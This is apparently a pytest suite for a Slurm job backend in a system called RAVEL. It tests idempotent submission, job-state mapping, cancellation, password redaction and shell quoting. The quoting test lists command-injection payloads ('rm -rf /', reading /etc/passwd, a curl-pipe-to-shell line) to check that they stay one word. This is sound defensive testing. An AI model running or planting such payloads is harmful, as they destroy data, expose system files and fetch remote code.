"""The Slurm backend against a cluster that answers commands.

Every test here runs the real `SlurmComputeBackend` — the object a deployment
constructs, with the same command strings and the same parsing — against
`ScriptedCluster`, which is a transport and nothing else. What is left out is
the network, and that is the point: the failures worth testing in a backend that
spends money are the ones a live cluster will not produce on demand.

The three that matter most:

**A second `submit` must not start a second job.** RAVEL calls `submit` again
whenever it cannot tell whether the first call arrived. Against a mock that is
free; here it is a second allocation. So there are tests for a resumed process
that never saw the first call, for a job that is already queued, and for one
that has already finished and left the queue.

**A credential must not leave the process.** The scripted cluster is configured
with a password and can be told to echo it back on every command, which is what
a chatty login wrapper does. Nothing the backend returns may contain it.

**A missing required output is reported, not raised.** A run that produced
three of four files ended and produced three of four files; turning that into an
exception would make it an infrastructure fault and re-run the simulation.
"""

from __future__ import annotations

import base64
import json
from pathlib import Path
from typing import Any

import pytest
from tests.unit.backends.slurm.conftest import JOBS_ROOT, PASSWORD, Connections, ScriptedCluster

from ravel.backends.slurm import (
    SUBMISSION_FILE,
    SlurmComputeBackend,
    SlurmSubmissionError,
    SlurmTarget,
)
from ravel.domain.enums import FailureClass, JobState
from ravel.execution.backends import ExternalDelivery, JobRequest

PROJECT = "0f1e2d3c4b5a69788796a5b4c3d2e1f0"
NODE = "aabbccddeeff00112233445566778899"
CONTRACT = "c0ffee00112233445566778899aabbcc"

MANIFEST = {
    "project_id": PROJECT,
    "node_id": NODE,
    "required_outputs": ["conductivity.csv"],
    "method": "GCMC",
}

WORKSPACE_FILES = {
    "simulation.input": b"FrameworkName alumina\n",
    "job.slurm": b"#!/bin/bash\n#SBATCH --job-name=ravel-abc\nexec simulation simulation.input\n",
    "calculation_manifest.json": json.dumps(MANIFEST).encode("utf-8"),
}


@pytest.fixture
def target() -> SlurmTarget:
    return SlurmTarget(host="cluster.example.org", username="ravel", password=PASSWORD)


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    """A prepared workspace on this machine, as preparation leaves one."""
    root = tmp_path / "run"
    root.mkdir()
    for name, body in WORKSPACE_FILES.items():
        (root / name).write_bytes(body)
    return root


@pytest.fixture
def request_for(workspace: Path):
    def build(**overrides: Any) -> JobRequest:
        # `Any` rather than `object`: the overrides are heterogeneous by design —
        # a caller swaps the objective for a string and the attempt for an int —
        # and `JobRequest`'s own parameters are what check them.
        fields: dict[str, Any] = {
            "project_id": PROJECT,
            "node_id": NODE,
            "attempt": 1,
            "execution_contract_ref": CONTRACT,
            "execution_contract_version": 1,
            "objective": "Measure the uptake of CO2 in alumina.",
            "required_outputs": ("conductivity.csv",),
            "workspace_path": str(workspace),
            "entrypoint": "job.slurm",
        }
        fields.update(overrides)
        return JobRequest(**fields)

    return build


def a_backend(connections: Connections, target: SlurmTarget) -> SlurmComputeBackend:
    """The real backend, reached through the scripted cluster.

    No database and no object store: those are needed by `collect`, which is
    exercised in `tests/integration/backends/test_slurm_collection.py` where
    both are real. Nothing in this file stores anything.
    """
    return SlurmComputeBackend(target=target, connect=connections)


# ── Submitting ──────────────────────────────────────────────────────────────


def test_submitting_uploads_the_workspace_and_starts_the_job(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    digest = backend.digest_for(request_for())

    assert handle.backend_job_ref == f"slurm:7001:{digest}"
    assert handle.state is JobState.SUBMITTED
    # The whole workspace arrived, at the same relative paths, so that what runs
    # is what preparation built and hashed.
    remote = f"{JOBS_ROOT}/{PROJECT}/{NODE}/1"
    for name, body in WORKSPACE_FILES.items():
        assert cluster.files[f"{remote}/{name}"] == body
    # And the job script is executable, because a scheduler will not run one
    # that is not.
    assert f"chmod +x '{remote}/job.slurm'" in cluster.commands
    assert connections.all_closed


def test_the_job_is_named_for_the_work_and_runs_in_its_own_directory(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """The name is the idempotency key, and `--chdir` is what makes the run
    reproducible: a scheduler that started the job somewhere else would run the
    right script against the wrong directory."""
    backend = a_backend(connections, target)
    backend.submit(request_for())
    digest = backend.digest_for(request_for())
    remote = f"{JOBS_ROOT}/{PROJECT}/{NODE}/1"

    batch = next(command for command in cluster.commands if "sbatch --parsable" in command)
    assert f"--job-name='ravel-{digest}'" in batch
    assert f"--chdir='{remote}'" in batch
    assert batch.endswith(f"'{remote}/job.slurm'")
    assert cluster.jobs["7001"]["name"] == f"ravel-{digest}"
    assert cluster.jobs["7001"]["dir"] == remote


def test_a_second_submit_of_the_same_work_does_not_start_a_second_job(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """The property RAVEL depends on and cannot supply for itself.

    RAVEL writes the job row, commits, and then calls `submit`; a worker killed
    in between leaves a row that says "submitted, no reference", and RAVEL's
    answer is to call `submit` again. Against a cluster that is a second
    allocation running the same simulation.
    """
    backend = a_backend(connections, target)
    first = backend.submit(request_for())
    second = backend.submit(request_for())

    assert first.backend_job_ref == second.backend_job_ref
    assert len(cluster.jobs) == 1
    assert sum(1 for command in cluster.commands if "sbatch --parsable" in command) == 1


def test_a_job_already_queued_under_this_name_is_adopted(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """The check that catches a submission from a process that died before it
    could write the record.

    A different RAVEL process submitted this work and was killed before
    `submission.json` reached the cluster. Nothing local knows about the job;
    the scheduler does, and its name is derived from the work, so it is found.
    """
    backend = a_backend(connections, target)
    digest = backend.digest_for(request_for())
    remote = f"{JOBS_ROOT}/{PROJECT}/{NODE}/1"
    cluster.submit(f"ravel-{digest}", remote)

    handle = backend.submit(request_for())

    assert handle.backend_job_ref == f"slurm:7001:{digest}"
    assert sum(1 for command in cluster.commands if "sbatch --parsable" in command) == 0
    # And the record is written now, so the next restart takes the first path.
    assert json.loads(cluster.files[f"{remote}/{SUBMISSION_FILE}"])["job_id"] == "7001"


def test_a_job_that_has_left_the_queue_is_still_recognised(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """`squeue` forgets a finished job; `sacct` does not. Both are asked.

    Without the second lookup, a retried `submit` for an attempt that already
    ran would submit it again — the worst of the duplicates, because the work
    would be redone rather than merely requeued.
    """
    backend = a_backend(connections, target)
    digest = backend.digest_for(request_for())
    remote = f"{JOBS_ROOT}/{PROJECT}/{NODE}/1"
    cluster.submit(f"ravel-{digest}", remote)
    cluster.jobs["7001"]["state"] = "COMPLETED"

    handle = backend.submit(request_for())

    assert handle.backend_job_ref == f"slurm:7001:{digest}"
    assert sum(1 for command in cluster.commands if "sbatch --parsable" in command) == 0


def test_a_contract_that_names_no_workspace_is_refused(
    connections: Connections, target: SlurmTarget, request_for
) -> None:
    """A contract naming no environment is prepared with no directory. There is
    no job script and nothing to upload, and the honest answer is to say so
    rather than to invent a directory to run in."""
    backend = a_backend(connections, target)
    with pytest.raises(SlurmSubmissionError) as refused:
        backend.submit(request_for(workspace_path=""))
    assert "no workspace was prepared" in str(refused.value)


def test_a_workspace_that_is_not_on_this_machine_is_refused(
    connections: Connections, target: SlurmTarget, request_for, tmp_path
) -> None:
    backend = a_backend(connections, target)
    with pytest.raises(SlurmSubmissionError) as refused:
        backend.submit(request_for(workspace_path=str(tmp_path / "gone")))
    assert "not on this machine" in str(refused.value)


def test_a_workspace_with_nothing_in_it_is_refused(
    connections: Connections, target: SlurmTarget, request_for, tmp_path
) -> None:
    empty = tmp_path / "empty"
    empty.mkdir()
    backend = a_backend(connections, target)
    with pytest.raises(SlurmSubmissionError) as refused:
        backend.submit(request_for(workspace_path=str(empty)))
    assert "is empty" in str(refused.value)


def test_a_scheduler_that_refuses_the_job_says_what_it_said(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """The failure is raised, not recorded. Temporal retries it, and the retry
    is safe because `submit` is idempotent — the scheduler's own refusal is
    what a person needs to see when the retry also fails."""
    cluster.answers["sbatch"] = cluster.answers.get("sbatch") or __import__(
        "ravel.backends.slurm.ssh", fromlist=["CommandResult"]
    ).CommandResult(
        command="sbatch", exit_status=1, stderr="sbatch: error: Invalid partition"
    )
    backend = a_backend(connections, target)
    with pytest.raises(SlurmSubmissionError) as refused:
        backend.submit(request_for())
    assert "Invalid partition" in str(refused.value)


def test_an_entrypoint_the_contract_does_not_name_is_refused(
    connections: Connections, target: SlurmTarget, request_for
) -> None:
    backend = a_backend(connections, target)
    with pytest.raises(SlurmSubmissionError) as refused:
        backend.submit(request_for(entrypoint=""))
    assert "no entrypoint" in str(refused.value)


# ── Polling ─────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("slurm_state", "expected", "failure_class"),
    [
        ("PENDING", JobState.SUBMITTED, None),
        ("RUNNING", JobState.RUNNING, None),
        ("COMPLETED", JobState.COMPLETED, None),
        ("FAILED", JobState.FAILED, FailureClass.NON_RETRYABLE),
        ("OUT_OF_MEMORY", JobState.FAILED, FailureClass.NON_RETRYABLE),
        ("NODE_FAIL", JobState.FAILED, FailureClass.INFRA_RETRYABLE),
        ("TIMEOUT", JobState.TIMED_OUT, FailureClass.NON_RETRYABLE),
        ("CANCELLED", JobState.CANCELLED, None),
    ],
)
def test_a_job_state_is_reported_in_ravels_words_beside_slurms(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
    slurm_state: str,
    expected: JobState,
    failure_class: FailureClass | None,
) -> None:
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"]["state"] = slurm_state
    if slurm_state != "COMPLETED":
        cluster.jobs["7001"]["exit"] = "1:0"

    status = backend.status(handle.backend_job_ref)

    assert status.state is expected
    assert status.failure_class is failure_class
    # Slurm's own word travels beside RAVEL's, so a reader can see the two
    # disagree without opening a table.
    assert status.backend_state == slurm_state
    assert slurm_state in status.detail


def test_a_running_job_is_read_from_the_queue_not_the_log(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"]["state"] = "RUNNING"

    status = backend.status(handle.backend_job_ref)

    assert status.state is JobState.RUNNING
    assert status.progress["source"] == "squeue"


def test_a_job_the_scheduler_has_no_record_of_is_a_failure_ravel_cannot_classify(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """Reporting `None` rather than guessing is what stops a silent retry.

    Something happened to this job and neither the queue nor the accounting log
    will say what. A backend that called it infrastructure would re-run an
    experiment whose fate is unknown; one that called it scientific failure
    would blame work that may never have run.
    """
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    del cluster.jobs["7001"]

    status = backend.status(handle.backend_job_ref)

    assert status.state is JobState.FAILED
    assert status.failure_class is None
    assert "RAVEL does not retry" in status.detail


def test_a_scheduler_that_cannot_answer_is_a_fault_and_not_a_status(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """Neither command answered, and that is a failure to *observe*.

    The distinction decides who acts. A `JobStatus` goes through `decide_retry`
    and can start a second attempt — a second allocation — whereas an exception
    makes Temporal retry the poll. Nothing about the job changed; only RAVEL's
    view of it did, and a scheduler that is down is asked again rather than
    answered for.
    """
    from ravel.backends.slurm.ssh import CommandResult, TransportError

    cluster.answers["squeue"] = CommandResult(command="squeue", exit_status=255)
    cluster.answers["sacct -n -P -j"] = CommandResult(command="sacct", exit_status=255)
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())

    with pytest.raises(TransportError) as lost:
        backend.status(handle.backend_job_ref)
    assert "neither squeue nor sacct" in str(lost.value)


def test_the_progress_of_a_finished_job_carries_the_schedulers_account(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"].update({"state": "COMPLETED", "exit": "0:0", "batch_exit": "0:0"})

    status = backend.status(handle.backend_job_ref)

    assert status.progress["exit_code"] == 0
    assert status.progress["elapsed"] == "00:12:34"
    assert status.progress["max_rss"] == "1234K"


def test_a_failure_class_is_reported_only_when_the_job_has_ended(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """A class belongs to a failure. A running job has not failed, whatever the
    previous attempt's outcome was."""
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"]["state"] = "RUNNING"
    assert backend.status(handle.backend_job_ref).failure_class is None


# ── Cancelling ──────────────────────────────────────────────────────────────


def test_cancelling_a_running_job_asks_the_scheduler_to_stop_it(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"]["state"] = "RUNNING"

    assert backend.cancel(handle.backend_job_ref) is True
    assert "scancel 7001" in cluster.commands
    assert cluster.jobs["7001"]["state"] == "CANCELLED"


def test_cancelling_a_finished_job_is_refused_rather_than_raised(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """The port says a refusal is not an error: there is nothing left to stop,
    and a caller that treated it as a fault would fail a run that ended."""
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"]["state"] = "COMPLETED"

    assert backend.cancel(handle.backend_job_ref) is False
    assert "scancel 7001" not in cluster.commands


# ── Delivering ──────────────────────────────────────────────────────────────


def test_a_delivery_to_a_slurm_job_is_reported_and_changes_nothing(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """A cluster waits for nothing outside itself, so there is nowhere for a
    delivery to go. The state comes back unchanged with a line saying why: a
    caller that reached here has a bug, and this is how it gets found."""
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"]["state"] = "RUNNING"

    status = backend.deliver(
        handle.backend_job_ref, ExternalDelivery(summary="the lab answered")
    )

    assert status.state is JobState.RUNNING
    assert "waits for nothing outside itself" in status.detail
    assert cluster.jobs["7001"]["state"] == "RUNNING"


# ── The credential ──────────────────────────────────────────────────────────


def test_the_password_is_nowhere_in_what_the_backend_hands_back(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """The cluster is told to echo the password on every command, which is what
    a chatty login wrapper or a misconfigured `ssh` alias does.

    A `detail` line is written to a PostgreSQL column and a traceback goes to a
    log; both outlive the process that held the credential.
    """
    cluster.stderr_echo = f"\nwarning: authenticated with password {PASSWORD}\n"
    backend = a_backend(connections, target)
    handle = backend.submit(request_for())
    cluster.jobs["7001"]["state"] = "FAILED"
    cluster.jobs["7001"]["exit"] = "1:0"

    status = backend.status(handle.backend_job_ref)

    assert PASSWORD not in str(status.detail)
    assert PASSWORD not in str(status.progress)
    assert PASSWORD not in str(cluster.commands)


def test_the_scheduler_refusing_the_job_does_not_echo_the_password(
    connections: Connections,
    target: SlurmTarget,
    cluster: ScriptedCluster,
    request_for,
) -> None:
    """The one message that leaves the process as an *exception*, which is the
    path most likely to end up verbatim in a log file."""
    from ravel.backends.slurm.ssh import CommandResult

    cluster.answers["sbatch"] = CommandResult(
        command="sbatch",
        exit_status=1,
        stderr=f"sbatch: error: invalid account, password {PASSWORD} rejected",
    )
    backend = a_backend(connections, target)
    with pytest.raises(SlurmSubmissionError) as refused:
        backend.submit(request_for())
    assert PASSWORD not in str(refused.value)
    assert "invalid account" in str(refused.value)


def test_the_password_is_not_a_field_of_the_backend() -> None:
    """It lives on the target the transport reads and nowhere else.

    The backend is the object that gets logged, repr'd and passed around; a
    secret on it would be one `repr()` away from a traceback.
    """
    target = SlurmTarget(host="cluster.example.org", username="ravel", password=PASSWORD)
    assert target.password == PASSWORD
    assert "password" not in {
        field for field in SlurmComputeBackend.__dataclass_fields__ if field != "target"
    }


# ── References ──────────────────────────────────────────────────────────────


def test_a_reference_carries_a_digest_of_the_work_and_nothing_else() -> None:
    """A reference is a `REF` column, and those hold sixty-four characters.

    The three-part key spelled out is seventy-six, so the digest is what makes
    the reference fit — and it is derived from the work rather than generated,
    which is what lets a process that never saw the first call recognise the
    same attempt.
    """
    backend = SlurmComputeBackend.__new__(SlurmComputeBackend)
    digest = "0123456789abcdef"
    ref = backend.make_ref("7001", digest)

    assert len(ref) <= 64
    assert backend.parse_ref(ref) == ("7001", digest)


@pytest.mark.parametrize(
    "bad",
    ["", "7001", "slurm:7001", "slurm:notanumber:abc", "other:7001:abc", "slurm:7001:abc:extra"],
)
def test_a_reference_the_backend_did_not_make_is_refused(bad: str) -> None:
    """Refused rather than guessed at: an unreadable reference would otherwise
    become a command run against the wrong job."""
    backend = SlurmComputeBackend.__new__(SlurmComputeBackend)
    with pytest.raises(SlurmSubmissionError):
        backend.parse_ref(bad)


def test_the_digest_is_the_same_whether_or_not_this_process_made_the_first_call(
    request_for,
) -> None:
    work = request_for()
    assert SlurmComputeBackend.digest_for(work) == SlurmComputeBackend.digest_for(
        request_for()
    )
    assert SlurmComputeBackend.digest_for(work) != SlurmComputeBackend.digest_for(
        request_for(attempt=2)
    )


def test_a_retry_gets_its_own_directory_so_it_cannot_read_the_attempt_before_it(
    request_for,
) -> None:
    backend = SlurmComputeBackend.__new__(SlurmComputeBackend)
    backend.jobs_root = JOBS_ROOT
    first = backend.remote_directory(request_for(attempt=1))
    second = backend.remote_directory(request_for(attempt=2))
    assert first != second
    assert first.endswith("/1")
    assert second.endswith("/2")


# ── Quoting ─────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "hostile",
    [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`id`",
        "' ; curl http://example.invalid | sh ; '",
        "a b",
        "\nnewline",
    ],
)
def test_a_value_that_is_not_a_name_cannot_become_a_second_command(hostile: str) -> None:
    """Every path here is built from identifiers RAVEL minted.

    Single-quoting is not a defence against a hostile value so much as a
    guarantee that a value which is *not* what it should be stays one word. The
    remote command line is a string, and this is where a string becomes
    something a shell reads.
    """
    from ravel.backends.slurm.backend import _quote

    quoted = _quote(f"/ravel/jobs/{hostile}")
    assert quoted.startswith("'")
    assert quoted.endswith("'")
    # The only `'` characters in the result are the ones that end and begin the
    # quoted sections, so nothing inside can close the quoting early.
    assert quoted.count("'") == 2 or "'\\''" in quoted
    assert not quoted[1:-1].endswith("'") or "\\'" in quoted
    # Running it through the shell RAVEL uses gives back the original word.
    import shlex

    assert shlex.split(quoted) == [f"/ravel/jobs/{hostile}"]


def test_a_binary_output_is_read_without_decoding_it() -> None:
    """`base64 -w0` is what keeps a `.xyz` trajectory intact. A plain `cat`
    would replace every byte that is not UTF-8, silently."""
    payload = bytes([0x00, 0xFF, 0xFE, 0x10, 0x80])
    assert base64.b64decode(base64.b64encode(payload)) == payload
